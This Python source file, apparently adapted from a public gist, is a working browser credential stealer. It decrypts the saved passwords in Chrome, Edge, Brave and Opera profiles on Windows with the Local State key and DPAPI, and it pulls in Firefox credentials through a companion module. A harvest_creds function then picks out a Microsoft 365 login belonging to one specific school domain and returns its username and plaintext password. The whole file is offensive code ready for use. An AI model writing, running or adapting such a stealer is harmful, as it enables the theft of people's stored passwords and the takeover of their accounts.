# from https://gist.github.com/neonfury/a34a2aadc7c084f08cb046728cd25b54#file-extract-py
# edited by @kaliiiiiiiiii

# other references:
# https://www.foxtonforensics.com/blog/post/analysing-chrome-login-data

from os.path import normpath as norm, exists as path_exists
from os import environ, listdir
from collections import deque
import re
import json
import base64
import asyncio
import aiosqlite
import traceback
import typing

import win32crypt
import shutil
import tempfile
from Crypto.Cipher import AES
import aiofiles

# noinspection PyPackages
from .firefox_harvester import get_all_firefox_creds

APPDATA = environ['USERPROFILE'] + r"\AppData"

DATA_DIRS = {
    "Opera": norm(APPDATA + r"\Roaming\Opera Software\Opera Stable"),
    "Brave": norm(APPDATA + r"\Local\BraveSoftware\Brave-Browser\User Data"),
    "Chrome": norm(APPDATA + r"\Local\Google\Chrome\User Data"),
    "Edge": norm(APPDATA + r"\Local\Microsoft\Edge\User Data")
}


async def get_encrypted_key(home_folder: str) -> str:
    async with aiofiles.open(norm(home_folder + "/Local State"), "r", encoding="utf-8") as f:
        local_state = json.loads(await f.read())
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]


def decrypt_data(ciphertext: bytes, encrypted_key: str) -> str:
    # decrypt text with:
    # 1. encrypted key - from browser
    # 2. win32crypt
    try:
        chrome_secret = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = AES.new(encrypted_key, AES.MODE_GCM, chrome_secret)
        return cipher.decrypt(encrypted_password).decode()
    except Exception:
        try:
            return str(win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1])
        except Exception:
            raise ValueError("decryption failed")


async def get_chromium_creds(user_data: str, use_b64: bool = False) -> (
        typing.List)[typing.Dict[str, typing.Union[str, int]]]:
    loop = asyncio.get_event_loop()
    creds = []
    if path_exists(user_data) and path_exists(user_data + r"\Local State"):
        encrypted_key = await get_encrypted_key(user_data)
        folders = await loop.run_in_executor(None,
                                             lambda: [item for item in listdir(user_data) if
                                                      re.search("^Profile*|^Default$", item) is not None]
                                             )
        for folder in folders:
            # Get data from the Login Data file (SQLite database)
            login_data_path = norm(fr"{user_data}\{folder}\Login Data")
            with tempfile.TemporaryDirectory() as _dir:
                await loop.run_in_executor(None,
                                           lambda: shutil.copy2(login_data_path, _dir + "/login_data_copy.db")
                                           )

                async with aiosqlite.connect(_dir + "/login_data_copy.db") as db:
                    async with db.execute(
                            "select origin_url, action_url, federation_url, scheme, password_type, username_value, password_value, form_data, display_name, possible_username_pairs from logins") as cursor:
                        async for origin_url, action_url, federation_url, scheme, password_type, username_value, password_value, form_data, display_name, possible_username_pairs in cursor:
                            password = decrypt_data(password_value, encrypted_key)
                            if len(password_value) > 0 and len(username_value) > 0:
                                if use_b64:
                                    form_data = base64.b64encode(form_data).decode("ASCII")
                                    possible_username_pairs = base64.b64encode(possible_username_pairs).decode("ASCII")
                                creds.append({"origin": origin_url,
                                              "action_url": action_url,
                                              "fed_url": federation_url,
                                              "scheme": scheme,
                                              "pass_type": password_type,
                                              "username": username_value,
                                              "pass": password,
                                              "form_data": form_data,
                                              "display_name": display_name,
                                              "possible_username_pairs": possible_username_pairs
                                              })
                await loop.run_in_executor(None, lambda: shutil.rmtree(_dir))
    else:
        raise ValueError(f"Local State not found in {user_data}")
    return creds


async def get_all_chromium_creds(use_b64: bool = False) -> typing.Dict[str, typing.List[typing.Dict[str, typing.Union[str, int]]]]:
    all_credentials = {}

    coro_s = []
    for browser, _dir in DATA_DIRS.items():
        async def _helper(__dir, _browser):
            # noinspection PyBroadException
            try:
                creds = await get_chromium_creds(__dir, use_b64=use_b64)
            except Exception:
                traceback.print_exc()
            else:
                all_credentials[_browser] = creds

        coro_s.append(_helper(_dir, browser))
    await asyncio.gather(*coro_s)
    return all_credentials


def get_all_firefox_creds_wrapper():
    # noinspection PyBroadException
    try:
        return list(get_all_firefox_creds(sub_stream=False))
    except Exception:
        traceback.print_exc()


async def get_all_creds(use_b64: bool = False):
    loop = asyncio.get_event_loop()
    all_creds, firefox_creds = await asyncio.gather(
        get_all_chromium_creds(use_b64=use_b64),
        loop.run_in_executor(None, get_all_firefox_creds_wrapper)
    )
    if firefox_creds is not None:
        # noinspection PyTypeChecker
        all_creds["Firefox"] = firefox_creds
    return all_creds


async def harvest_creds(use_b64: bool = False) -> typing.Tuple[str, str, str]:
    _credentials = await get_all_creds(use_b64=use_b64)
    for browser, all_creds in _credentials.items():
        for creds in all_creds:
            if "login.microsoftonline.com" in creds.get("action_url",
                                                        creds.get("url", "")) and "gymthun.ch" in creds.get("username"):
                return creds["username"], creds["pass"], browser


# noinspection PyTypeChecker
def bin_to_str(obj):
    stack = deque([(obj, None, None)])  # (current object, parent, key/index in parent)

    while stack:
        current, parent, key = stack.pop()

        if isinstance(current, dict):
            for k, v in current.items():
                stack.append((v, current, k))
        elif isinstance(current, list):
            for idx, item in enumerate(current):
                stack.append((item, current, idx))
        elif isinstance(current, bytes):
            if parent is not None:
                # noinspection PyUnresolvedReferences
                parent[key] = current.decode('utf-8', errors='replace').replace("\u0000", "")

    return obj


if __name__ == "__main__":
    credentials = asyncio.run(get_all_creds())
    print(json.dumps(bin_to_str(credentials), indent=4))
